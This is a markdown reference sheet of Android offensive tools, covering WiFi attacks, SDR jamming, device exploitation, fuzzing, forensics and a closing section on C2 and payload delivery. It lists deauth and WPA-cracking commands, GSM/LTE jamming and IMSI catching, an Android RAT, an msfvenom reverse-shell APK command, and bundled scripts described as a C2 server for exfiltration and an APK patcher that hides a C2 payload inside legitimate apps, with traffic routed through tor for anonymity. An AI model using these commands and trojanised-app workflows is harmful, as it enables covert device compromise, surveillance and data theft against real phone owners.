# Android Offensive Security Tool Reference

## WiFi & Network Attacks

### WEF (WiFi Evil Framework)
- **Repo:** `https://github.com/D3Ext/WEF`
- **Use:** Automated evil twin AP deployment with captive portal
- **Setup:** `git clone https://github.com/D3Ext/WEF && cd WEF && bash setup.sh`
- **Key features:** Deauth attacks, captive portal templates, credential harvesting

### Bettercap
- **Repo:** `https://github.com/bettercap/bettercap`
- **Use:** Swiss-army knife for WiFi, BLE, HID, Ethernet attacks
- **Key modules:** `wifi.recon`, `wifi.deauth`, `net.probe`, `http.proxy`, `ble.recon`

### Aircrack-ng Suite
- `airodump-ng wlan0mon` — WiFi scanning and packet capture
- `aireplay-ng -0 10 -a <BSSID> wlan0mon` — Deauth attack
- `aircrack-ng -w wordlist.txt capture.cap` — WPA cracking

## SDR / Jamming

### BladeRF
- **Hardware:** BladeRF x40/xA4/xA9
- **Use:** Wideband SDR for GSM/LTE/5G jamming, IMSI catching
- **Software:** `bladeRF-cli`, GNU Radio, YateBTS, OpenBTS

### HackRF
- **Hardware:** HackRF One
- **Use:** Lower-cost SDR alternative, half-duplex
- **Note:** Limited TX power, may need amplifier for effective jamming

## Device Exploitation

### PhoneSploit-Pro
- **Repo:** `https://github.com/AzeemIdrisi/PhoneSploit-Pro`
- **Use:** Automated ADB-based Android exploitation
- **Features:** Device info, screen mirroring, app management, file extraction

### Beerus RAT
- **Repo:** `https://github.com/hakaioffsec/beerus-android`
- **Use:** Android Remote Access Trojan framework
- **Features:** C2 communication, persistence, data exfiltration

## Dynamic Instrumentation

### Frida
- **Site:** `https://frida.re`
- **Setup:** `pip install frida-tools && frida-server-<arch>` on device
- **Key scripts:** SSL pinning bypass, root detection bypass, hook templates

### Objection
- **Repo:** `https://github.com/sensepost/objection`
- **Setup:** `pip install objection`
- **Key commands:** `android sslpinning disable`, `android root disable`, `android hooking list classes`

### Xposed Framework + Inspeckage
- **Xposed:** Framework for system-level hooks (requires root)
- **Inspeckage:** `https://github.com/ac-pm/Inspeckage` — Xposed module for automated app analysis
- **Features:** Hooks for crypto, intents, file access, network, WebView

## Static Analysis

### APKTool
- **Site:** `https://apktool.org`
- **Use:** `apktool d target.apk -o output/` — decompile to smali/resources
- **Recompile:** `apktool b output/ -o modified.apk`

### JADX
- **Repo:** `https://github.com/skylot/jadx`
- **Use:** `jadx target.apk -d output/` — decompile DEX to Java source
- **GUI:** `jadx-gui target.apk`

### MobSF
- **Repo:** `https://github.com/MobSF/Mobile-Security-Framework-MobSF`
- **Use:** Automated static + dynamic analysis platform
- **Setup:** Docker or `pip install mobsf`

### Drozer
- **Repo:** `https://labs.withsecure.com/tools/drozer`
- **Use:** Android security assessment framework
- **Key commands:** `run app.package.list`, `run app.activity.start`, `run scanner.provider.finduris`

## Forensics

### Andriller
- **Use:** Automated forensic data extraction from Android
- **Features:** Decrypts backups, extracts databases, media, call logs

### Autopsy / Sleuth Kit
- **Site:** `https://www.sleuthkit.org`
- **Use:** Disk image forensics for Android filesystem images

### ExifTool
- **Site:** `https://exiftool.org`
- **Use:** Media metadata extraction (GPS, timestamps, device info)

### Magnet ACQUIRE
- **Site:** Free download from Magnet Forensics
- **Use:** Android image acquisition (logical + physical where supported)

## Traffic Interception

### Burp Suite
- **Use:** HTTP/HTTPS proxy for mobile app traffic analysis
- **Setup:** Configure device proxy → install Burp CA → bypass cert pinning with Frida

### mitmproxy
- **Site:** `https://mitmproxy.org`
- **Use:** Open-source alternative to Burp Suite
- **Benefits:** Scriptable with Python, transparent proxy mode

## Cloud / C2

### ngrok
- **Site:** `https://ngrok.com`
- **Use:** Expose local C2 server to internet via secure tunnel
- **Note:** Free tier limited, useful for quick C2 exposure during operations

### Metasploit
- **Site:** `https://www.metasploit.com`
- **Use:** `msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -o payload.apk`
- **Modules:** Android-specific exploits, post-exploitation modules

## Chip-Level Tools

### MTK Client
- **Repo:** `https://github.com/bkerler/mtkclient`
- **Use:** MediaTek bootrom exploit for unlocking, flashing, dumping
- **Relevance:** Most Oppo/Realme/Xiaomi/Redmi devices use MTK chipsets

### QFIL / QPST
- **Use:** Qualcomm flashing tools (EDL/firehose mode)
- **Relevance:** Samsung, Pixel, OnePlus Snapdragon devices

## Exploit Development & Fuzzing

### AFL++
- **Repo:** `https://github.com/AFLplusplus/AFLplusplus`
- **Use:** Coverage-guided fuzzing for C/C++ targets
- **Setup:** `bash scripts/fuzzing_setup.sh` or `make && sudo make install`

### libFuzzer
- **Use:** In-process fuzzing with SanitizerCoverage (built into clang)
- **Benefits:** Extremely fast, easy to write harnesses
- **Compile:** `clang -g -fsanitize=fuzzer,address harness.c -o harness`

### syzkaller
- **Repo:** `https://github.com/google/syzkaller`
- **Use:** Kernel fuzzer — target Linux/Android kernel syscalls
- **Android targets:** Binder, ashmem, ion, GPU drivers, media codecs

### Honggfuzz
- **Repo:** `https://github.com/google/honggfuzz`
- **Use:** Hardware-assisted fuzzing (Intel PT / BTS)
- **Alternative to:** AFL++ with different coverage strategy

### Radamsa
- **Use:** Black-box mutation fuzzer for quick testing
- **Pattern:** `radamsa seed_file > mutated_input`

### pwntools
- **Site:** `https://pwntools.org`
- **Install:** `pip install pwntools`
- **Use:** Exploit development — assembly, ROP chains, shellcode, remote I/O
- **Android:** `context.arch = 'aarch64'` for ARM64 exploit dev

### GDB + GEF
- **GDB-multiarch:** Cross-architecture debugging (ARM/ARM64)
- **GEF:** `https://github.com/hugsy/gef` — enhanced GDB plugin
- **Usage:** `gdb-multiarch -ex "target remote :1234"`

### ROPgadget / ropper
- **ROPgadget:** `pip install ROPgadget` — find ROP gadgets in binaries
- **ropper:** `pip install ropper` — alternative with search/chain generation
- **Usage:** `ROPgadget --binary libc.so | grep "ldr x0"`

### QEMU (ARM/AArch64)
- **Use:** Emulate Android userspace or kernel for exploit testing
- **Kernel debugging:** `qemu-system-aarch64 -kernel Image -s -S`
- **Userspace:** `qemu-aarch64-static -g 1234 ./target_binary`

### Unicorn Engine
- **Site:** `https://www.unicorn-engine.org`
- **Use:** CPU emulator for embedding in fuzz harnesses
- **Pattern:** Emulate specific ARM instructions for targeted fuzzing

### Proxmark3 / InternalBlue / BtleJuice
- **Proxmark3:** RFID/NFC research and fuzzing hardware
- **InternalBlue:** Broadcom Bluetooth firmware fuzzing and debugging
- **BtleJuice:** BLE MITM and fuzzing framework

### Nexmon
- **Repo:** `https://github.com/seemoo-lab/nexmon`
- **Use:** Broadcom WiFi firmware patching and fuzzing
- **Target:** WiFi frame parsing vulnerabilities in chipset firmware

## C2 & Payload Delivery

### C2 Server (Bundled)
- **Path:** `scripts/c2/c2_server.py`
- **Use:** Flask C2 for Android payloads — registration, heartbeat, exfiltration, commands
- **Deploy:** `python3 c2_server.py --port 443 --output /data/exfil --ssl`

### APK Patcher (Bundled)
- **Path:** `scripts/c2/apk_patcher.sh`
- **Use:** Inject C2 payload into legitimate APK with persistence
- **Usage:** `bash apk_patcher.sh legit.apk https://c2-server.com output.apk`

### Frida Payload Template (Bundled)
- **Path:** `scripts/c2/payload_template.js`
- **Use:** Frida hook with C2 connectivity for data exfiltration and remote commands
- **Usage:** `frida -U -l payload_template.js -f com.target.app`

### Metasploit
- **Site:** `https://www.metasploit.com`
- **Use:** `msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -o payload.apk`
- **Modules:** Android-specific exploits, post-exploitation modules

### ngrok
- **Site:** `https://ngrok.com`
- **Use:** Expose local C2 server to internet via secure tunnel
- **Note:** Free tier limited, useful for quick C2 exposure during operations

### proxychains / tor
- **Use:** Route C2 traffic through proxy chain for anonymity
- **Setup:** `proxychains4 python3 c2_server.py` or `torify python3 c2_server.py`
